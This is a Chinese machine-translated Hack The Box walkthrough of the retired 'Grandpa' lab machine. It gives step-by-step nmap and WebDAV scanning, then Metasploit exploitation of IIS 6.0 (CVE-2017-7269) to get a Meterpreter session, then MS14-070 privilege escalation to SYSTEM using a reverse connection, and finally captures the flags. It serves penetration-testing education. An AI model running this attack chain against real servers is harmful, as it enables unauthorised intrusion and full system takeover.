# 保持冷静，黑盒子-爷爷

> 原文：<https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-grandpa/>

黑客盒子(HTB)是一个在线平台，让你测试你的渗透测试技能。它包含几个不断更新的挑战。有些是模拟真实世界的场景，有些更倾向于 CTF 风格的挑战。

**注**。*只允许报道退役的 HTB 机器。*

![Screenshot-2020-04-07-at-14.54.17](img/917a31dad513fbcaa3fa1ffd8c5c53be.png)

爷爷是 Hack The Box 上较简单的机器之一，然而它涵盖了被广泛利用的 CVE-2017-7269。此漏洞很容易被利用，当它成为公开信息时，可以立即访问全球数千台 IIS 服务器

我们将使用以下工具将盒子典当在一个 [Kali Linux 盒子](https://www.kali.org/)上

*   nmap
*   Searchsploit
*   憎恶
*   Metasploit
*   建议利用本地漏洞

让我们开始吧。

我在/etc/hosts 文件中添加了爷爷

```
nano /etc/hosts
```

随着

```
10.10.10.14     grandpa.htb
```

![Screenshot-2020-04-13-at-21.58.02](img/b74d8bbe62932e761646f19b55fd75b4.png)

## 第一步-侦察

开发一台机器的第一步是做一些扫描和侦察。

这是最重要的部分之一，因为它将决定你以后可以尝试利用什么。在这个阶段花更多的时间来获取尽可能多的信息总是更好的。

## 端口扫描

我将使用 Nmap(网络映射器)。Nmap 是一个用于网络发现和安全审计的免费开源工具。它使用原始 IP 数据包来确定网络上有哪些主机可用、这些主机提供什么服务、它们运行什么操作系统、使用什么类型的包过滤/防火墙以及许多其他特征。

这个工具有许多命令可以用来扫描网络。如果你想了解更多，你可以看一下文档[这里](https://tools.kali.org/information-gathering/nmap)。

![Screenshot-2020-04-13-at-22.00.02](img/3a7dc094776fe81cf91987bb3326814d.png)

我使用以下命令来执行密集扫描:

```
nmap -A -v grandpa.htb
```

**-A:** 启用操作系统检测、版本检测、脚本扫描和跟踪路由

**-v:** 增加详细级别

**爷爷. htb:** 爷爷盒子的主机名

如果您发现结果有点太多，您可以执行另一个命令来只获取开放的端口。

```
nmap grandpa.htb
```

![Screenshot-2020-04-13-at-21.59.22](img/3b5c7495e575a108d66e4c590808014b.png)

我们可以看到只有一个开放端口:

****港口** 80** 。超文本传输协议(HTTP)最常用

从 http-server-header 中我们知道服务器是 IIS 6.0。**互联网信息服务** ( **IIS** ，前身为**互联网信息服务器**)是微软为 Windows NT 家族开发的可扩展网络服务器软件。更多信息[点击这里](https://en.wikipedia.org/wiki/Internet_Information_Services)

> 包含在 Windows Server 2003 和 Windows XP Professional x64 Edition 中的 IIS 6.0(代码名为“Duct Tape”)增加了对 IPv6 的支持，并包含一个新的工作进程模型，该模型提高了安全性和可靠性。HTTP.sys 作为 HTTP 请求的 HTTP 特定协议侦听器引入 IIS 6.0 中

我们还可以从 **http-title** 中看到该网站“正在建设中”,并且有一个 **http-webdav-scan** 包含所有允许的方法

我使用 nmap 脚本来尝试获取更多信息。该脚本发送一个选项请求，其中列出了 dav 类型、服务器类型、日期和允许的方法。然后，它发送一个 PROPFIND 请求，并试图通过在响应体中进行模式匹配来获取公开的目录和内部 IP 地址

```
nmap --script http-webdav-scan -p80 grandpa.htb
```

以下是 nmap 网站上关于这个脚本的更多信息

![Screenshot-2020-04-13-at-22.00.37](img/52498c706ef14e93a715cc84d214f34d.png)

WebDAV 或 **Web 分布式创作和版本控制** ( **WebDAV** )是超文本传输协议的扩展，允许客户端执行远程 Web 内容创作操作。更多信息[点击这里](https://en.wikipedia.org/wiki/WebDAV)

在服务器支持部分我们可以看到微软的 IIS 有一个 WebDAV 模块。

我用 [**davtest**](https://tools.kali.org/web-applications/davtest) 来检查我是否能上传文件

![Screenshot-2020-04-28-at-15.54.24](img/85265217c5f45392c9b5c769f7652720.png)

我使用以下命令

```
davtest -url http://10.10.10.14
```

![Screenshot-2020-04-24-at-14.18.29](img/f2933b237b46934fe21ecde2f0c71585.png)

看起来不像。我使用 **Searchsploit** 来检查 IIS 6.0 上是否存在任何已知的漏洞。Searchsploit 是一款针对 **[漏洞数据库](https://www.exploit-db.com/)** 的命令行搜索工具

![Screenshot-2020-04-13-at-22.01.08](img/3a88eff82d2e93c96b2cfd449316f032.png)

我使用以下命令

```
searchsploit iis 6.0
```

![Screenshot-2020-04-13-at-22.02.14](img/849cfe09799eaa47b940a15ee0dcc95d.png)

我可以有更多的利用细节

```
searchsploit -x 41738.py
```

![Screenshot-2020-04-13-at-22.01.38](img/fc8676a3236933161f6c3128ae319c02.png)

该攻击基于一个[面向返回的编程](https://en.wikipedia.org/wiki/Return-oriented_programming)链。**面向返回的编程** ( **ROP** )是一种安全利用技术，它允许攻击者在存在安全防御(如可执行空间保护和代码签名)的情况下执行代码

您也可以检查**漏洞数据库**来查找漏洞

![Screenshot-2020-04-24-at-14.28.52](img/0a0c79658b7de8770deb7d641fc69070.png)

[https://www.exploit-db.com/search?q=iis+6.0](https://www.exploit-db.com/search?q=iis+6.0)

![Screenshot-2020-04-07-at-16.19.42](img/e043c44f3029f11401c6c23d41ec35d9.png)

[https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)

**国家漏洞数据库**

![Screenshot-2020-04-28-at-22.56.07](img/44e691775caeed1a08fc1c81161c5b06.png)

[https://nvd.nist.gov/vuln/detail/CVE-2017-7269](https://nvd.nist.gov/vuln/detail/CVE-2017-7269)

**常见漏洞和暴露**数据库

![Screenshot-2020-04-28-at-22.57.52](img/125958ccb341a0255e50f827187ef8b2.png)![Screenshot-2020-04-07-at-16.20.27](img/492e3c8d22fbdef0590c1fa3deb022c0.png)

[https://www.cvedetails.com/cve/CVE-2017-7269/](https://www.cvedetails.com/cve/CVE-2017-7269/)

有一个可用的 Metasploit 模块

![Screenshot-2020-04-07-at-16.20.54](img/b4390f6abf7c5d85cf23c76b60958ffb.png)

[https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl](https://www.rapid7.com/db/modules/exploit/windows/iis/iis_webdav_scstoragepathfromurl)

## 第 2 步-访问网站

我们在访问网站时看到的不多。从开发者控制台，我们可以看到它是由 ASP.NET 框架驱动的

![Screenshot-2020-04-28-at-15.50.25](img/2e64873d6af4587058ea8d9913f7403e.png)

我们将使用 **Metasploit** ，这是一个渗透测试框架，使黑客攻击变得简单。这是许多攻击者和防御者的必备工具

![Screenshot-2019-08-02-at-21.14.13](img/2fb5761a131675409fefeb7123464487.png)

[https://www.metasploit.com/](https://www.metasploit.com/)

我在 Kali 上启动 **Metasploit 框架**,并寻找我应该用来启动漏洞利用的命令

![Screenshot-2020-04-24-at-14.33.34](img/ecd390261c240c4bd09bf621a9bf4b66.png)

如果我使用这个命令

```
searchsploit iis 6.0
```

我得到了之前从终端得到的相同的表

如果我打字

```
search iis 6.0
```

我得到 174 个结果

![Screenshot-2020-04-24-at-14.38.22](img/66fafce6480fe42769b79ad288a976b2.png)

我感兴趣的漏洞是这个列表中的第 147 个

如果您想了解一些关于这个漏洞的信息，您可以使用下面的命令

```
info exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

您将获得更多关于该漏洞的详细信息

![Screenshot-2020-04-28-at-23.11.30](img/2692e471fce18733552f3107da07b66b.png)

我使用以下命令来利用漏洞

```
use exploit/windows/iis/iis_webdav_scstoragepathfromurl
```

我需要在利用漏洞之前设置选项。我用检查选项

```
show options
```

![Screenshot-2020-04-24-at-14.43.36](img/09ebcae809abf2927edddc57c207ab80.png)

我用下面的命令设置了 **RHOSTS**

```
set RHOSTS 10.10.10.14
```

当我再次检查选项时，我得到了这个

![Screenshot-2020-04-24-at-14.47.50](img/3c7e0f40f41a62e948b6ed01ee77dfab.png)

我检查目标是否易受攻击

```
check
```

然后，我用命令运行漏洞利用

```
exploit
```

![Screenshot-2020-04-24-at-15.40.40](img/be681ecac1ae5dd0473335d2ec81649b.png)

我得到了一个**米普雷特**会话

从[攻击性安全](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)网站上，我们得到了对 Meterpreter 的定义

> Meterpreter 是一个高级的、可动态扩展的有效负载，它使用*内存中的* DLL 注入阶段，并在运行时通过网络进行扩展。它通过 stager 套接字进行通信，并提供全面的客户端 Ruby API。它具有命令历史，标签完成，渠道，等等。

你可以在这里阅读更多关于 Meterpreter [的信息](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/)

让我们从收集一些信息开始

**getuid** 返回调用进程的真实用户 id。我得到的会话似乎没有足够的权限运行此命令。访问被拒绝

![Screenshot-2020-04-24-at-15.41.37](img/2acc7d32a54061f1b208db25cdd588ba.png)

当这种情况发生时，我用

```
ps
```

并挑选一个运行**NT AUTHORITY \ NETWORK SERVICE**

![Screenshot-2020-04-28-at-15.59.49](img/d2ef74b0cd9df3ac2ccaaca2be18bbfe.png)

我转移到进程 3644

```
migrate 3644
```

![Screenshot-2020-04-28-at-15.58.21](img/1bdb26bf224adc3aa14c5703432fcaa9.png)

现在当我检查 getuid 时，我得到了

```
Server username: NT AUTHORITY\NETWORK SERVICE 
```

![Screenshot-2020-04-28-at-15.58.37](img/ad2775faa111e47d42368f2aafda5ec2.png)

这是我在迁移到另一个进程之前首先得到的会话

![Screenshot-2020-04-28-at-16.20.57](img/b5f610c36d818ade11c5ecfefdaa418a.png)

这是我迁移到另一个进程后得到的会话

![Screenshot-2020-04-28-at-16.21.14](img/d76bf2673ca51c579035a564e59dc9b0.png)

我键入以下命令在目标系统上获得标准 shell

```
shell
```

![Screenshot-2020-04-28-at-16.01.13](img/af5f08d84bd20f5ef8ec9b96ed7cf0d9.png)

我在机器上用命令检查我是谁

```
whoami
```

![Screenshot-2020-04-28-at-16.01.23](img/a38547e0eea5b0a48d28844412524f89.png)

我从这台机器上得到更多的信息

```
systeminfo
```

![Screenshot-2020-04-28-at-16.01.35](img/7008ac5fe980509325b45bf7528b3c5b.png)

我导航到 **C:\**

![Screenshot-2020-04-28-at-16.03.43](img/b85960ad4d90594d007fa372ef7efb7e.png)

然后用**文档和设置**

```
cd "Documents and Settings"
```

![Screenshot-2020-04-28-at-16.04.05](img/6bbd980ed338f5aef61ffb7aa7aa9e14.png)

我可以看到两个用户- **管理员**和**哈利**。我试着找到哈利。访问被拒绝。管理员文件夹也是如此——这是意料之中的，因为我还没有 root 权限

![Screenshot-2020-04-28-at-16.04.13](img/894bea28c24d86de72ed70e75c4e5a6f.png)

我用命令退出 shell

```
exit
```

![Screenshot-2020-04-28-at-16.06.47](img/797badf2a9205f6206251f0c1d971108.png)

## 步骤 3 -使用本地漏洞利用建议器

我运行 [**本地漏洞利用提示器**](https://www.rapid7.com/db/modules/post/multi/recon/local_exploit_suggester) 。根据用户打开的外壳的体系结构和平台以及 meterpreter 中可用的漏洞来建议利用漏洞

```
run post/multi/recon/local_exploit_suggester
```

![Screenshot-2020-04-28-at-16.07.12](img/fb775780c5f037d244c4c21f966b6fae.png)

我将使用 **MS14-070** 漏洞。我通过以下方式寻找更多关于 **Metasploit** 的信息

```
info exploit/windows/local/ms14_070_tcpip_ioctl
```

![Screenshot-2020-04-28-at-23.36.28](img/5c9479e7844ac524a791a31fcd462f8e.png)

以及在网站上

![Screenshot-2020-04-28-at-23.33.04](img/101527e7a2622bf044761310542ecb69.png)

[https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl](https://www.rapid7.com/db/modules/exploit/windows/local/ms14_070_tcpip_ioctl)

## 步骤 4 -使用 MS14-070 执行权限提升

我用命令将这个会话放在后台

```
background
```

![Screenshot-2020-04-28-at-16.11.48](img/d20f2de13667e6c28d8018e28164e964.png)

我运行以下命令来使用我发现的漏洞

```
use exploit/windows/local/ms14_070_tcpip_ioctl
```

![Screenshot-2020-04-28-at-16.12.00](img/4ecf1c6d07ed44a63bdbb62b4aa1f8bb.png)

然后我检查这个漏洞的选项

![Screenshot-2020-04-28-at-16.12.33](img/2fe1e8a62208346c34533fb7df4440c9.png)

我将会话设置为

```
set SESSION 1
```

![Screenshot-2020-04-28-at-16.12.49](img/de94f9d7597ae2488df0ab27be6a0f66.png)

我运行漏洞利用

```
run
```

![Screenshot-2020-04-28-at-16.13.05](img/d70ef904668466552b30ea7cd1fe0a1b.png)

漏洞利用成功了，但我没有得到一个外壳回来。我检查了选项

![Screenshot-2020-04-28-at-16.13.16](img/868a3ce3feafc3bd6d3f457762ad8d7b.png)

并将 LHOST 设置为我的 IP 地址

```
set LHOST 10.10.14.36
```

你可以在这里查看你的

![Screenshot-2020-04-28-at-16.13.44](img/77a3b8a47372123bb1d259d50223eaa8.png)

然后，我使用

```
exploit
```

![Screenshot-2020-04-28-at-16.13.57](img/ad402c8c363a351efc34722046670cd4.png)

这证实了利用已经成功，但我仍然没有得到一个外壳。我检查了会话

```
sessions -l
```

我应该的

```
NT AUTHORITY\SYSTEM
```

![Screenshot-2020-04-28-at-16.16.36](img/0ae588984362346ae5999c7d1ba7213b.png)

现在不是这样了，所以我回到这个话题

```
sessions -i 1
```

![Screenshot-2020-04-28-at-16.38.45](img/89712790261a68133af7901b1b427dea.png)

我检查 **getuid** 并取回 **NT AUTHORITY\SYSTEM** 。我在目标系统上得到一个标准 shell，并检查我在机器上是谁。我拿回了 **NT 权限\网络服务**，这不是我想要的！

我退出这个 shell 并检查进程。我可以看到我在这台机器上有管理员权限。我只需要迁移到另一个进程——我就是这样做的

```
migrate 408
```

![Screenshot-2020-04-28-at-16.39.58](img/abc882b9ccb16621e0c30492a01bec1c.png)

回到目标系统上的标准 shell，当我在机器上检查我是谁时，我终于是管理员了！

## **步骤 5 -** 寻找 user.txt 标志

我从**文档和设置**中导航到**哈利**文件夹

我可以用下面的命令列出所有的文件/文件夹

```
dir
```

然后我移动到**桌面**

![Screenshot-2020-04-28-at-16.53.25](img/bf4b12c08b1eddbed73e4965b04efa70.png)

我找到了用户标志！我可以检查文件的内容

```
type user.txt
```

![Screenshot-2020-04-28-at-16.42.19](img/ac85d252453417960e1fa55107dbbe4c.png)

## **步骤 6 -** 寻找 root.txt 标志

让我们现在找到根旗！我导航到**用户**并登记到**管理员** / **桌面**文件夹。我找到旗子了！

![Screenshot-2020-04-28-at-16.42.58](img/b481714f50342076ecaea3164c734fe4.png)

我使用以下命令来查看文件的内容

```
type root.txt
```

![Screenshot-2020-04-28-at-16.43.08](img/12a1b453f7f65f293d80a4a2da74f409.png)

恭喜你。你找到了两面旗子！

请随时评论、提问或与朋友分享:)

你可以在这里看到更多我的文章

你可以在推特上关注我，也可以在 T2 的 LinkedIn 上关注我

别忘了# **GetSecure** ，# **BeSecure** ，# **StaySecure** ！

* * *

****其他黑盒子文章****

*   [保持冷静，黑掉瘸子](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-lame/)
*   [保持冷静，黑掉盒子——遗产](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-legacy/)
*   保持冷静，黑掉盒子
*   [保持冷静，黑盒子——哔](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-beep/)
*   [保持冷静，黑盒子——最佳](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-optimum/)
*   [保持冷静，黑掉盒子——北极](https://www.freecodecamp.org/news/keep-calm-and-hack-the-box-arctic/)

![Artist - Maureen White](img/21b17929b01dd7304f249d3b5eef80bd.png)